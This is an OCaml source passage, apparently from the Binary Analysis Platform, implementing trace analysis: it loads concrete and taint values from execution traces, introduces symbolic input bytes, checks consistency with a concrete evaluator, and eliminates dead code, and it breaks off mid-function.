(** A module to perform trace analysis *)

open Arch
open Ast
open Ast_convenience
open BatListFull
open Big_int_Z
open Big_int_convenience
open Symbeval
open Type

module D = Debug.Make(struct let name = "Traces" and default=`NoDebug end)
module DV = Debug.Make(struct let name = "TracesVerbose" and default=`NoDebug end)
open D

(** So here's how we will do partial symbolic execution on
    traces:
    1. A trace is a list of AST stmts as executed by the
    program
    2. Execute the trace and at each instruction:

    a) check if it is a taint introduction stmt
    b) if it is, update the memory context with the symbolic
    variables
    c) If it a regular stmt, read the new concrete values and
    taint flags and store them in a map
    d) whenever the symbolic evaluator requests a value that is
    known and untainted, provide it with the value from the map
      - if it is tainted let the evaluator worry about it

*)

(** Optional consistency check between trace and bap evaluation.
    Tainted values should always be equal in the BAP evaluation and the
    trace.  Non-tainted values do not have to match, since their values
    are assumed to be constant. *)
let consistency_check = ref false;;

(** Option used to force checking of an entire trace. *)
let checkall = ref false;;

(** For each register, map it to an assignment and record the value of
    !current_time when the assignment happened. *)
type stmt_info = { assignstmt: stmt; assigned_time: int; }

(** Current time in executor (number of statements executed) *)
let current_time = ref 0

(** Last special concretely executed *)
let last_special = ref (Ast.Comment("No specials executed", []))

(** The time that the last special was assigned at *)
let last_time = ref 0

(** Map each register to the assembly instruction that set it. Useful
    for interpreting consistency failures. *)
let reg_to_stmt = Hashtbl.create 20;;

let dce = ref true;;

(* Concretizing as much as possible *)
let allow_symbolic_indices = ref false

let padding = ref true

let memtype = function
  | X86_32 -> reg_32
  | X86_64 -> reg_64

let endtrace = "This is the final trace block"

let tassignattr = StrAttr("Tainted Concrete Assignment")

(** Statements we want to execute during concrete execution, but do
    not want to keep in the final output *)
let dontkeepattr = StrAttr "Do not include in concrete trace output"

(*************************************************************)
(**********************  Datastructures  *********************)
(*************************************************************)

(* The datastructures that are be used during trace analysis *)

(* A type for all concrete values *)
type value =
{
  exp   : Ast.exp;
  usg   : usage;
  tnt   : bool;
}

type environment =
{
  vars:        (string,value)  Hashtbl.t;
  memory:      (big_int,value)   Hashtbl.t;
  symbolic:    (big_int,Ast.exp) Hashtbl.t;
  symbolicvar: (int,Ast.exp) Hashtbl.t;
}

(* A global environment to keep the concrete and taint
   information of the statement block that is analyzed *)
let global =
  {
  vars        = Hashtbl.create 100;
  memory      = Hashtbl.create 100;
  symbolic    = Hashtbl.create 100;
  symbolicvar = Hashtbl.create 100;
}

(* Some wrappers to interface with the above datastructures *)

(** Create a lookup for our variables *)
let gamma arch = Asmir.gamma_for_arch arch

(** Convert name of a register to a var for that register *)
let name_to_var arch name =
  try
    Some(Asmir.gamma_lookup (gamma arch) name)
  with Failure _ ->
    if (name <> "Unknown") then wprintf "Did not find %s in gamma" name;
    None

(* XXX: Delete as many of these as possible *)

let var_lookup v = try Some(Hashtbl.find global.vars v) with Not_found -> None
let mem_lookup i = try Some(Hashtbl.find global.memory i) with Not_found -> None
let sym_lookup i =
  try Hashtbl.find global.symbolicvar i
  with Not_found ->
    let newvarname = "symb_" ^ (string_of_int i) in
    let sym_var = Var (Var.newvar newvarname reg_8) in
    let () = Hashtbl.add global.symbolicvar i sym_var in
    sym_var

(** This is a map from DSA variable names to standard variable names. *)
let dsa_rev_map = ref None

(** Convert a DSA var to a normal var *)
let dsa_var dv =
  match !dsa_rev_map with
  | Some(map) ->
      (try Some(VH.find map dv)
       with Not_found -> None)
  | None -> Some(dv)

(** Get original variable name from DSA var *)
let dsa_orig_name dv =
  match dsa_var dv with
  | Some(x) -> Some(Var.name x)
  | None -> None

(** Looks for concrete value information by a DSA name *)
let dsa_var_lookup dv =
  match dsa_var dv with
  | Some(v) ->
      var_lookup (Var.name v)
  | None -> None

let concrete_val name = match (var_lookup name) with
  | Some(e) -> Some(e.exp)
  | None -> None
let dsa_concrete_val dv = match dsa_var_lookup dv with
  | Some(e) -> Some(e.exp)
  | None -> None
let concrete_mem index = match (mem_lookup index) with
  | Some(e) -> Some(e.exp)
  | None -> None
let symbolic_mem = Hashtbl.find global.symbolic

let taint_val name = match (var_lookup name) with
  | Some(x) -> Some(x.tnt)
  | None -> None
let dsa_taint_val dv = match (dsa_var_lookup dv) with
  | Some(x) -> Some(x.tnt)
  | None -> None
let taint_mem index = match (mem_lookup index) with
  | Some(x) -> Some(x.tnt)
  | None -> None

let bound = Hashtbl.mem global.vars
let in_memory = Hashtbl.mem global.memory

let add_var var value usage taint =
  Hashtbl.replace global.vars var
    {exp=value;
     usg=usage;
     tnt=taint;}
let add_mem index value usage taint =
  Hashtbl.add global.memory index
    {exp=value;
     usg=usage;
     tnt=taint;}
let add_symbolic = Hashtbl.replace global.symbolic

let add_new_var var value usage taint =
(*  if not (bound var) then *)
  dprintf "Adding value %s for %s" (Pp.ast_exp_to_string value) var;
  add_var var value usage taint

let del_var var =
  while Hashtbl.mem global.vars var do
    Hashtbl.remove global.vars var
  done

let dsa_del_var dv =
  match dsa_var dv with
  | Some(v) -> del_var (Var.name v)
  | None -> ()

let del_mem index =
  while Hashtbl.mem global.memory index do
    Hashtbl.remove global.memory index
  done

let del_symbolic = Hashtbl.remove global.symbolic

let cleanup () =
  Hashtbl.clear global.vars;
  Hashtbl.clear global.memory;
  Hashtbl.clear global.symbolic;
  dsa_rev_map := None

let conc_mem_fold f =
  Hashtbl.fold f global.memory
let conc_mem_iter f =
  Hashtbl.iter f global.memory


(*************************************************************)
(*********************  Helper Functions  ********************)
(*************************************************************)

let symb_re = Str.regexp "^symb_\\([0-9]+\\)$";;

let get_symb_num (Var.V(_, s, _)) =
  if Str.string_match symb_re s 0 then
    int_of_string(Str.matched_group 1 s)
  else
    failwith ("Expected a symbolic: " ^ s)

(* Return a list of bytes read from a file *)
let bytes_from_file file =
  let cin = open_in file in
  let bytes = ref [] in
  let rec get_bytes () =
    bytes := (input_byte cin)::!bytes ;
    get_bytes ()
  in
    try get_bytes () with End_of_file -> () ;
    close_in cin;
    List.rev !bytes


(** A list of registers that we will never check for correctness.  *)
let badregs = Hashtbl.create 32
let () =
  List.iter (fun r -> Hashtbl.add badregs r ())
    (
      "R_EFLAGS"
      ::"R_RFLAGS"
      ::"R_EIP"
      ::"R_RIP"
      ::"R_GS"
      ::"R_FS"
      ::"R_LDTR"
      ::"R_GDTR"
      ::"R_CC_OP"
      ::"R_CC_DEP1"
      ::"R_CC_DEP2"
      ::"R_CC_NDEP"
      ::[])

(** A list of registers that we should only check when checking
    all instructions.  This includes EFLAGS registers because we will
    not consider an instruction tainted if the only operand that is
    tainted is EFLAGS. *)
let checkallregs = Hashtbl.create 32
let () =
  List.iter (fun r -> Hashtbl.add checkallregs r ())
    ("R_AF"
     ::"R_CF"
     ::"R_ZF"
     ::"R_OF"
     ::"R_SF"
     ::"R_PF"
     ::[])

let isnotallbad v = if not !checkall then Hashtbl.mem checkallregs (Var.name v) 
  else false
let isbad v = Hashtbl.mem badregs (Var.name v) || isnotallbad v

let print_vars () =
  let printone k v = 
    dprintf "Info for register %s %s" k (Pp.ast_exp_to_string v.exp) in
  Hashtbl.iter printone global.vars

(** Build a statement asserting that each operand is equal to its value in the 
    trace

    @param h Mapping of vars to dsa vars
*)
let assert_vars arch h =
  let addone k v a =
    match name_to_var arch k with
    | Some(realv) ->
        (match taint_val (Var.name realv) with
        | Some(true) ->
            if not (isbad realv) then (
              if VH.mem h realv then
                let eq = BinOp(EQ, Var(realv), v.exp) in
                BinOp(AND, eq, a)
              else a) else a
        | _ -> a)
    | None -> a
  in
  let bige = Hashtbl.fold addone global.vars exp_true in
  Assert(bige, [])

(** Build statements assigning concrete operands

    @param thread_map_lookup Mapping of variables on a per thread basis.

    @param symbolic Set to true when symbolically executing and false
    when concretely executing.  When symbolic mode is enabled, only
    non-tainted operands will be assigned.
*)
let assign_vars arch memv thread_map_lookup symbolic =
  let getattrs = function
    | true -> [tassignattr]
    | false -> []
  in
  let addone k v a =
    match name_to_var arch k with
    | Some(realv) ->
        let realv = thread_map_lookup realv in
        (* SWXXX Add another option for type of trace, if it is concrete, only
           add move if instruction was unknown *)
        (* SWXXX Add state of "do we have a valid symbolic formula" for the
           variable.  Starts as false (and thus a move is inserted) Reset
           to false when we see an unknown instruction *)
        (match symbolic, v.tnt with
         | true, false (* Symbolic execution, non-tainted *)
         | false, _ (* Concrete execution *) ->
             Move(realv, v.exp, getattrs v.tnt)::a
         | true, true (* Symbolic, tainted *) -> a)
    | None -> a
  in
  let addmem k v a =
    (* What should we do when we have symbolic tainted indices? Should
       we introduce concrete memory information? We are doing this for
       now. *)
    match symbolic, v.tnt with
    | true, false (* Symbolic *)
    | false, _ (* Concrete *) ->
        Move(memv, Store(Var(memv), Int(k, memtype arch), v.exp, exp_false, reg_8),
             getattrs v.tnt)::a
    | true, true -> a
  in
  let bige = Hashtbl.fold addone global.vars [] in
  let bige = Hashtbl.fold addmem global.memory bige in
  bige


(** Get the expression for a symbolic value *)
let symbtoexp = function
  | Symbolic e -> e
  | _ -> failwith "Not a symbolic expression"

(* The number of bytes needed to represent each type *)
let typ_to_bytes = function
  | Reg 1 | Reg 8 -> 1
  | Reg 16 -> 2
  | Reg 32 -> 4
  | Reg 64 -> 8
  | _ -> failwith "not a register"

(* Get the ith byte of a value v *)
let get_byte i v = 
  (* Int64.logand (Int64.shift_right v ((i-1)*8)) 0xffL  *)
  and_big_int (shift_right_big_int v ((i-1)*8)) (biconst 0xff)

let num_to_bit num =
  if bi_is_zero num then bi0 else bi1
(* Wrappers & Useful shorthands to manipulate taint
   attributes and process taint info *)
let keep_taint = function
  | Context _ -> true
  | _ -> false

let unwrap_taint = function
  | Context c -> c
  | _ -> failwith "trying to unwrap a non-taint attribute"

(* Keeping only the attributes that contain taint info *)
let filter_taint atts =
  let atts = List.filter keep_taint atts in
    List.map unwrap_taint atts

let get_int = function
  | Int(v, t) -> let (i,_) = Arithmetic.to_val t v in
    i
  | _ -> failwith "Expected integer"

let taint_to_bool n = n != 0

let hd_tl = Util.hd_tl

let is_mem (Var.V(_,var,t)) =
  (String.length var >= 3) &&
    (String.sub var 0 3 = "mem") &&
  (match t with
  | TMem _
  | Array _ -> true
  | Reg _ -> false)

let is_temp =
  Disasm.is_temp

let is_tconcassign = (==) tassignattr

let is_symbolic (Var.V(_,s,_)) =
  try
    String.sub s 0 5 = "symb_"
  with _ -> false

(** remove temporaries from delta *)
let clean_delta delta =
  let clean_var v _ =
    if is_temp v then
      VH.remove delta v
  in
  VH.iter clean_var delta

(*
(* This is a total HACK due to VEX's handling of the direction flag *)
let direction_flag eflags =
  match num_to_bit (and_big_int eflags (biconst 0x400)) with
    | bi when bi_is_zero bi -> bi1
    | _ -> (big_int_of_int64 0xFFFFFFFFL)
*)

(* Unfortunately we need to special-case the EFLAGS registers
   since PIN does not provide us with separate registers for
   the zero, carry etc flags *)
let add_eflags eflags usage taint =
  add_var
    "R_AF"
    (Int(num_to_bit (and_big_int eflags (biconst 0x10)), reg_1))
    usage
    taint;
  add_var
    "R_CF"
    (Int(num_to_bit (and_big_int eflags (biconst 0x01)), reg_1))
    usage
    taint;
  add_var
    "R_ZF"
    (Int(num_to_bit (and_big_int eflags (biconst 0x40)), reg_1))
    usage
    taint;
  add_var
    "R_SF"
    (Int(num_to_bit (and_big_int eflags (biconst 0x80)), reg_1))
    usage
    taint;
  add_var
    "R_DF"
    (Int(num_to_bit (and_big_int eflags (biconst 0x400)), reg_1))
    usage
    false;
  add_var
    "R_OF"
    (Int(num_to_bit (and_big_int eflags (biconst 0x800)), reg_1))
    usage
    taint;
  add_var
    "R_PF"
    (Int(num_to_bit (and_big_int eflags (biconst 0x4)), reg_1))
    usage
    taint

 (* TODO: handle more EFLAGS registers *)
 (* TODO: handle RFLAGS *)


(** Get the vars used in a program *)
let allvars p =
  let h = VH.create 570 in
  let vis = object(self)
    inherit Ast_visitor.nop

    method visit_avar v =
      VH.replace h v ();
      DoChildren

    method visit_rvar = self#visit_avar
  end
  in
  ignore(Ast_visitor.prog_accept vis p);
  VH.fold (fun k () a -> k::a) h []

let find_memv trace =
  let vars = List.filter is_mem (allvars trace) in
  (* List.iter (fun x -> dprintf "memvar: %s" (Var.name x)) vars; *)
  match vars with
  | x::[] -> x
  | [] -> failwith "No mem vars"
  | _::_ -> failwith "More than one mem var"


(* Register mapping *)

let regs = Hashtbl.create 108

let () = List.iter (fun (k,v) -> Hashtbl.add regs k v) Asmir_vars.subregs


(********************************************************)

let is_seed_label = (=) "ReadSyscall"

(* Extract the tid from a list of stmts *)
let rec get_tid stmts =
  let rec get_tid_from_atts atts = 
    match atts with
    | [] -> None
    | a::ats -> (match a with
      | ThreadId i -> Some(i)
      | _ -> get_tid_from_atts ats)
  in
  (* If symbolic bytes are introduced, this should be a memory only operation
     and doesn't really have a thread ID, so set the thread ID to 0 *)
  match stmts with
  | Ast.Comment (c, _)::rest when (is_seed_label c) -> Some 0
  | stmt::_ -> get_tid_from_atts (get_attrs stmt)
  | [] -> None

(** Support muti-threaded traces by seperating variables per threadId *)
module ThreadVar = struct
  type t = int * Var.t
  let hash (i,v) = Hashtbl.hash (i, Var.hash v)
  let equal = (=)
  let compare (i1,v1) (i2,v2) = 
    let c1 = compare i1 i2 in 
    if c1 <> 0 then c1 else Var.compare v1 v2
end

module TVMake = Hashtbl.Make(ThreadVar)

module TVHash = struct
  include TVMake
  include Util.HashUtil(TVMake)
end

let create_thread_map_state () : Var.t TVHash.t = TVHash.create 1000

let lookup_thread_map map threadIDopt (Var.V(_,_,t) as avar) =
  match threadIDopt, t with
    | Some(threadID), Reg _ when Disasm.is_temp avar = false ->
      let nvar =
        try TVHash.find map (threadID, avar)
        with Not_found ->
          let new_name = (Var.name avar) in
          let newervar = Var.newvar new_name t in
          TVHash.add map (threadID, avar) newervar;
          newervar
      in
      nvar
    | Some(threadID), _ -> avar (* Ignore non register variables and temporaries *)
    | None, _ -> failwith "Can not lookup vars if no thread id exists!"

let explicit_thread_stmts_int tid stmts thread_map =
  (* check if tid is in first or second statement.  If it isn't, use None and
     don't change any variables *)
  let svis = object(self)
    inherit Ast_visitor.nop
    method visit_avar v = ChangeTo(lookup_thread_map thread_map tid v)
    method visit_rvar = self#visit_avar
  end
  in
  Ast_visitor.prog_accept svis stmts

(** Rename variables so they are unique to the thread they are found in *)
let explicit_thread_stmts stmts thread_map =
  let tid = get_tid stmts in
  explicit_thread_stmts_int tid stmts thread_map


(* Store the concrete taint info in the global environment *)
let add_to_conc {name=name; mem=mem; index=index; value=value;
                 t=typ; usage=usage; taint=Taint taint} =
  (* Stores the concrete (known) memory bytes in the global
     environment in little endian order *)
  let add_to_mem index value taint limit =
    let rec add_mem_aux index = function
      | 0 ->
          ()
      | n ->
          let byte = get_byte (limit-n+1) value in
            if not (in_memory index) then
              add_mem index (Int(byte,reg_8)) usage taint ;
            add_mem_aux (succ_big_int index) (n-1)
    in
      add_mem_aux index
  in
  let taint = taint_to_bool taint in
    if mem then
      let limit = typ_to_bytes typ in
        add_to_mem index value taint limit limit
    else
      (* assert (Hashtbl.mem concrete name = false) ; *)
      let fullname, shift, typ =
        try Hashtbl.find regs name
        with Not_found -> (name, 0,typ)
      in
      let bits = Arithmetic.to_big_int (shift_left_big_int value shift,typ) in
      let fullvalue = Int(bits,typ) in
      (add_new_var fullname fullvalue usage taint ;

      (* Special case EFLAGS *)
      if name = "R_EFLAGS" || name = "R_RFLAGS" then add_eflags value usage taint)

(* Updating the lookup tables with the concrete values *)
let update_concrete s =
  match s with
  (* | Label (Name s,atts) when is_seed_label s -> *)
  (*     (\* Taint introduction *\) *)
  (*     List.iter *)
  (*            (fun {index=index; taint=Taint taint} -> *)
  (*               (\* Mark the index as symbolic; we don't actually care about *)
  (*                  the value *\) *)
  (*               add_symbolic index (Int(0L, reg_8)) *)
  (*            ) (filter_taint atts); *)
  (*     false *)
  (* | Comment (s,atts) when is_seed_label s -> *)
  (*     (\* Taint introduction *\) *)
  (*     List.iter *)
  (*            (fun {index=index; taint=Taint taint} -> *)
  (*               (\* Mark the index as symbolic; we don't actually care about *)
  (*                  the value *\) *)
  (*               add_symbolic index (Int(bi0, reg_8)) *)
  (*            ) (filter_taint atts); *)
  (*     false *)
  | Label (_,atts) ->
      (* Concrete operands *)
      let conc_atts = filter_taint atts in
        if conc_atts <> [] then (
          cleanup ();
          List.iter add_to_conc conc_atts;
          true
        ) else false
  | _ -> false

(* (\** Get the address of the next instruction in the trace *\) *)
(* let rec get_next_address = function *)
(*   | [] -> raise Not_found *)
(*   | (Ast.Label ((Addr n),_))::_ ->  *)
(*       Name ("pc_"^(Int64.format "0x%Lx" n)) *)
(*   | _::xs -> get_next_address xs      *)

(* (\* Converts an address to a string label *\) *)
(* let to_label = function *)
(*   | Addr n -> Name ("pc_"^(Int64.format "0x%Lx" n)) *)
(*   | other -> other *)

(** Fetching the first stmt with attributes containing taint info *)
let rec get_first_atts = function
  | [] -> failwith "no taint analysis info were found in the trace"
  | (Ast.Label (_,atts))::rest ->
      let taint_atts = filter_taint atts in
        if taint_atts <> [] then (taint_atts, rest)
        else get_first_atts rest
  | s::rest ->
      get_first_atts rest

(** Initializing the trace contexts *)
(* let init_trace trace ctx =  *)
(*   let atts,_ = get_first_atts trace in *)
(*     (\* Create a memory to place the initial symbols *\) *)
(*   List.iter *)
(*     (fun {index=index; taint=Taint taint} -> *)
(*        let varname = "symb_"^(string_of_int taint) in *)
(*        let newvar = Var (Var.newvar varname reg_8) in *)
(*       add_symbolic index newvar *)
(*     ) atts; *)
(*     pdebug "Added the initial symbolic seeds"  *)

(** Removing all jumps from the trace *)
let remove_jumps =
  let no_jmps = function
    | Ast.Jmp _ -> false
    | _ -> true
  in
    List.filter no_jmps

(** Detect 'loaded module' specials *)
let is_loaded =
  let loaded = Str.regexp "^Loaded module " in
  function
    | Ast.Special(s, _, _) when Str.string_match loaded s 0 -> true
    | _ -> false

(** Remove 'Loaded module' specials *)
let remove_loaded = 
  let rs = function
    | Ast.Special(s, _, attrs) as sfull when is_loaded sfull 
        -> Ast.Comment(s, attrs)
    | s -> s
  in
  List.map rs

(** Removing all specials from the traces *)    
let remove_specials =
  let no_specials = function
    | Ast.Special(_, _, attrs) when not (List.mem (StrAttr "TraceKeep") attrs) 
        -> false
    | _ -> true
  in
    List.filter no_specials


(* (\** Removing all unknowns from the trace *\) *)
(* let remove_unknowns = *)
(*   let v = object(self) *)
(*     inherit Ast_visitor.nop *)
(*     method visit_exp = function *)
(*       | Unknown(s,t) -> *)
(*        dprintf "Removed unknown: %s" s; *)
(*        ChangeTo (Int(bi0,t)) *)
(*       | _ -> DoChildren *)
(*   end *)
(*   in Ast_visitor.prog_accept v *)

(* Appends a Halt instruction to the end of the trace *)
let append_halt trace =
  let halt = Ast.Halt (exp_true, []) in
    BatList.append trace [halt]

(** A trace is a sequence of instructions. This function
    takes a list of ast statements and returns a list of
    lists of ast stmts. Each one of those sublists will
    represent the IL of the executed assembly instruction *)
let trace_to_blocks trace =
  let rec to_blocks blocks current = function
    | [] ->
        List.rev ((List.rev current)::blocks)
    | (Ast.Label (Addr _, _) as l)::rest ->
        let block = List.rev current in
        to_blocks (block::blocks) [l] rest
    | (Ast.Comment (c, _) as s)::rest when c = endtrace || (is_seed_label c) ->
        let block = List.rev current in
        to_blocks (block::blocks) [s] rest
    | x::rest ->
        to_blocks blocks (x::current) rest
  in
  let blocks = to_blocks [] [] trace in
    List.filter (fun b -> List.length b > 1) blocks

(** Strips the last jump of the block *)
(* let strip_jmp block = *)
(*   match List.rev block with *)
(*       | (Ast.Jmp _)::rest -> List.rev rest *)
(*       | _ -> block *)

(*************************************************************)
(*************************  Printers  ************************)
(*************************************************************)

let print = Printf.printf

let print_block =
  List.iter (fun s -> pdebug (Pp.ast_stmt_to_string s))

let trace_length trace =
  print "Trace length: %d\n" (List.length trace)

module Status = Util.StatusPrinter

(******************************************************************************)
(*                         Trace Deadcode Elimination                         *)
(******************************************************************************)
(** In a nutshell, remove any computation that is not referenced
    inside of an Assert. *)
let trace_dce trace =
  Status.init "Deadcode elimination" 0 ;
  let rvh = VH.create 1000 in
  (** This visitor traverses trace statements backwards.  Any variable
      referenced in an Assert is considered live. *)
  let rv = object(self)
    inherit Ast_visitor.nop
    method visit_stmt = function
        Assert _ -> DoChildren
      | Move (tv, _, _) when VH.mem rvh tv ->
          (* Include this statement, and add referenced vars. *)
          VH.remove rvh tv;
          DoChildren
      | Move (tv, _, _) as olds when not (VH.mem rvh tv) ->
          (* Remove this statement *)
          let str = 
            Printf.sprintf "Removed by dce: %s" (Pp.ast_stmt_to_string olds) in
          let news = Comment (str, []) in
            ChangeTo news
      | _ -> SkipChildren
    method visit_rvar v =
      VH.replace rvh v ();
      DoChildren
  end in
  let rev = Ast_visitor.prog_accept rv (List.rev trace) in
  let final = List.rev rev in

  Status.stop () ;
  final

(*************************************************************)
(********************  Concrete Execution  *******************)
(*************************************************************)

module TraceConcreteDef =
struct

  include MemVHBackEnd

  let lookup_var delta var =

    DV.dprintf "looking up %s (concrete)" (Var.name var);

    try DV.dprintf "trying delta"; VH.find delta var
    with Not_found ->

          (* If the variable is memory, it's okay (we'll complain during
             lookup_mem if we can't find a value). If not, we're in
             trouble! *)

      match Var.typ var with
      | TMem _
      | Array _ ->
        empty_mem var
      | Reg _ ->
        if not (isbad var) then
          wprintf "Unknown variable during eval: %s" (Var.name var);
        Symbolic(Int(bi0, (Var.typ var)))

  let normalize = Symbeval.normalize

  let update_mem mu pos value endian =
    (match mu, pos with
    | ConcreteMem(_), Int(i,t) ->
        del_mem i
    | _ -> failwith "Bad memory for concrete evaluation");
    Concrete.update_mem mu pos value endian

  let lookup_mem mu index endian =
    (*pdebug ("index at " ^ (Pp.ast_exp_to_string index)) ;*)

    (* Look for the data in mu *)
    match mu, index with
    | ConcreteMem(m,v), Int(i,t) -> (

      (* If that doesn't work, check delta *)

      try AddrMap.find (normalize i t) m
      with Not_found ->
        (* Well, this isn't good... Just make something up *)
        wprintf "Unknown memory value during eval: addr %s" (~%i);
        Int(bi0, reg_8)
      )

    | _ -> failwith "Concrete evaluation should never have symbolic memories"

  include Symbeval.BuildMemLPrinters(MemVHBackEnd)

end

module TraceConcreteAssign(MemL: MemLookup)(Form: FlexibleFormula) =
struct
  let assign v ev ctx =
    let module StdAssign = Symbeval.StdAssign(MemL)(Form) in
    dsa_del_var v;
    StdAssign.assign v ev ctx
end

module TraceConcrete = 
  Symbeval.Make(TraceConcreteDef)(EvalSymbLet)(TraceConcreteAssign)(StdForm)

(** Check all variables in delta to make sure they agree with operands
    loaded from a trace. We should be able to find bugs in BAP and the
    trace code using this. *)
let check_delta state tid =
  (* let dsa_concrete_val v = concrete_val (Var.name v) in *)
  (* let dsa_taint_val v = taint_val (Var.name v) in *)
  let contains_unknown e =
    let foundone = ref false in
    let v = object(self)
      inherit Ast_visitor.nop
      method visit_exp = function
        | Unknown _ -> foundone := true; raise Exit
        | _ -> DoChildren
    end
    in
    (try
       ignore(Ast_visitor.exp_accept v e)
     with Exit -> ());
    !foundone
  in
  let check_mem mem_var cm addr v delta =
    if v.tnt || !checkall then (
      let tracebyte = get_int v.exp in
      let fix_state () =
        let mem = TraceConcrete.lookup_var delta mem_var in
        let newmem =
          TraceConcrete.update_mem mem
            (Int(addr, Reg 64)) (Int(tracebyte, reg_8)) exp_false
        in
        TraceConcrete.update_var delta mem_var newmem
      in
      try
        match AddrMap.find addr cm with
        | Int(v, t) -> let evalbyte = fst (Arithmetic.to_val t v) in
                       let issymb = Hashtbl.mem global.symbolic addr in
                       if (tracebyte <>% evalbyte) && (not issymb) then (
                         wprintf "Consistency error: Tainted memory value (address %s, value %s) present in trace does not match value %s in concrete evaluator" (~% addr) (~% tracebyte) (~% evalbyte);
                         fix_state ())
                       else delta
        | e when contains_unknown e -> delta
        | e -> failwith (Printf.sprintf "Expected Int or expression containing an unknown but got %s" (Pp.ast_exp_to_string e))
      with Not_found ->
        (* Even if checkall is enabled, we don't get an initial memory
           dump, so we should not report an error unless the value is
           tainted. *)
        if v.tnt then (
          wprintf "Consistency error: Tainted memory value (address %s, value %s) present in trace but missing in concrete evaluator" (~% addr) (~% tracebyte);
          fix_state ())
        else delta
    ) else delta
  in
  let check_var var evalval delta =
    match Var.typ var with
    | Reg _ -> (
      let dsavarname = dsa_orig_name var in
      let traceval = dsa_concrete_val var in
      let evalval = symbtoexp evalval in
      let tainted = dsa_taint_val var in
      (match dsavarname, traceval, tainted with
      | Some dsavarname, Some traceval, Some tainted ->
        DV.dprintf "Doing check on %s %b %b" dsavarname (tainted || !checkall) (not (isbad var));
        let s = if !checkall then "" else "tainted " in
        if (not (full_exp_eq traceval evalval) && (tainted || !checkall)
            && not (isbad var)) then
          (* The trace value and evaluator's value differ.  The
             only time this is okay is if the evaluated expression
             contains an unknown. *)
          if contains_unknown evalval then (
            dprintf "Unknown encountered in %s: %s" dsavarname (Pp.ast_exp_to_string evalval);
            delta
          ) else (
            let badstmt =
              try
                let {assignstmt; assigned_time} =
                  Hashtbl.find reg_to_stmt (var,tid)
                in
                let s = "{"^(Pp.ast_stmt_to_string assignstmt)^"}\n" in
                if assigned_time <= !last_time then
                  (* The special happened after our assignment *)
                  s^"special{"^(Pp.ast_stmt_to_string !last_special)^"}\n"
                else s
              with Not_found ->
                (* This is a little weird if this happens... *)
                "special{"^(Pp.ast_stmt_to_string !last_special)^"}"
            in
            let traceval_str = Pp.ast_exp_to_string traceval in
            let evalval_str = Pp.ast_exp_to_string evalval in
            wprintf "Difference between %sBAP and trace values for [*%s* Trace=%s Eval=%s]" s dsavarname traceval_str evalval_str;
            wprintf "This is due to one of the following statements:\n%s"  badstmt;
            (* Replace the incorrect value with the correct one from the trace *)
            TraceConcrete.update_var delta var (Symbolic traceval)
          ) else delta (* everything is fine *)
      | _ -> delta
      (* If we can't find concrete value, it's probably just a BAP
         temporary *)
      )
    )
    | TMem _
    | Array _ ->
        let cmem = match evalval with
          | ConcreteMem(cm, v) -> cm
          | Symbolic(e) -> failwith (Printf.sprintf "Concrete execution only: %s=%s" (Var.name var) (Pp.ast_exp_to_string e))
        in
        Hashtbl.fold (check_mem var cmem) global.memory delta

  in
  VH.fold check_var state.delta state.delta

let counter = ref 1

let get_symbolic_seeds arch memv = function
  (* | Ast.Label (Name s,atts) when is_seed_label s -> *)
  (*     List.fold_left *)
  (*    (fun acc {index=index; taint=Taint taint} -> *)
  (*       let newvarname = "symb_" ^ (string_of_int taint) in *)
  (*       let sym_var = Var (Var.newvar newvarname reg_8) in *)
  (*         pdebug ("Introducing symbolic: "  *)
  (*                 ^(Printf.sprintf "%Lx" index) *)
  (*                 ^" -> " *)
  (*                 ^(Pp.ast_exp_to_string sym_var)); *)
  (*         add_symbolic index sym_var ; *)
  (*         (\* symbolic variable *\) *)
  (*         let mem = Var(memv) in *)
  (*         let store = Store(mem, Int(index, reg_32), sym_var, exp_false, reg_8) in *)
  (*         (\* let constr = BinOp (EQ, mem, store) in *\) *)
  (*         (\*   ignore (LetBind.add_to_formula exp_true constr Rename) *\) *)
  (*         let move = Move(memv, store, []) in *)
  (*         move::acc                                  *)
  (*    ) [] (filter_taint atts) *)
  | Ast.Comment (s,atts) when is_seed_label s ->
      List.fold_left
        (fun (accl,accr) {index=index; taint=Taint taint; value=value} ->
           let sym_var = sym_lookup taint in
             pdebug ("Introducing symbolic: "
                     ^(Printf.sprintf "%s" (~% index))
                     ^" -> "
                     ^(Pp.ast_exp_to_string sym_var));
             add_symbolic index sym_var ;
             (* symbolic variable *)
             let mem = Var(memv) in
             let store = Store(mem, Int(index, memtype arch),
                               sym_var, exp_false, reg_8) in
             let store_concrete = Store(mem, Int(index, memtype arch),
                                        Int(value, reg_8), exp_false, reg_8) in
             (* let constr = BinOp (EQ, mem, store) in *)
             (*   ignore (LetBind.add_to_formula exp_true constr Rename) *)
             let move = Move(memv, store, []) in
             let move_concrete = Move(memv, store_concrete, [dontkeepattr]) in
             move::accl, move_concrete::accr
        ) ([],[]) (filter_taint atts)
  | _ -> ([],[])


(** Transformations needed for traces. *)
let trace_transform_stmt stmt evalf =
  let exp = ref exp_true in
  let cvis = object(self)
    inherit Ast_visitor.nop
    method visit_exp = function
      | Load(mem, idx, endian, t) ->
          let cidx = evalf idx in
          exp := BinOp(AND, !exp, BinOp(EQ, cidx, idx));
          ChangeToAndDoChildren(Load(mem, cidx, endian, t))
      | Store(mem, idx, value, endian, t) ->
          let cidx = evalf idx in
          exp := BinOp(AND, !exp, BinOp(EQ, cidx, idx));
          ChangeToAndDoChildren(Store(mem, cidx, value, endian, t))
      | _ -> DoChildren
  end
  in
  (* Concretize memory addresses *)
  let stmt =
    if not !allow_symbolic_indices then
      Ast_visitor.stmt_accept cvis stmt
    else stmt
  in
  let s = Printf.sprintf "Removed: %s" (Pp.ast_stmt_to_string stmt) in
  let com = Ast.Comment(s, []) in
  let concretize_jump_target e evalf =
    match evalf e with
    | Lab _ -> [] (* Can't concretize string labels *)
    | v -> (
      let e = binop EQ e v in
      let () = assert (e <> exp_false) in
      if e = exp_true then []
      else [Assert (e, [])])
  in
  let s = match stmt with
    | (Ast.CJmp (e,tl,_,atts1)) when full_exp_eq (evalf e) exp_true ->
      com :: Ast.Assert(e,atts1) :: concretize_jump_target tl evalf
    | (Ast.CJmp (e,_,fl,atts1)) when full_exp_eq (evalf e) exp_false ->
      com :: Ast.Assert(UnOp(NOT,e),atts1) :: concretize_jump_target fl evalf
    | Ast.CJmp _ -> failwith "Evaluation failure!"
    | (Ast.Jmp (e, _)) ->
      com :: concretize_jump_target e evalf
          (* Removing assignment of tainted operands: symbolic
             execution does not need these *)
    | Ast.Move (_, _, atts) when List.exists is_tconcassign atts -> []
    (* | s when Syscall_models.x86_is_system_call s -> *)
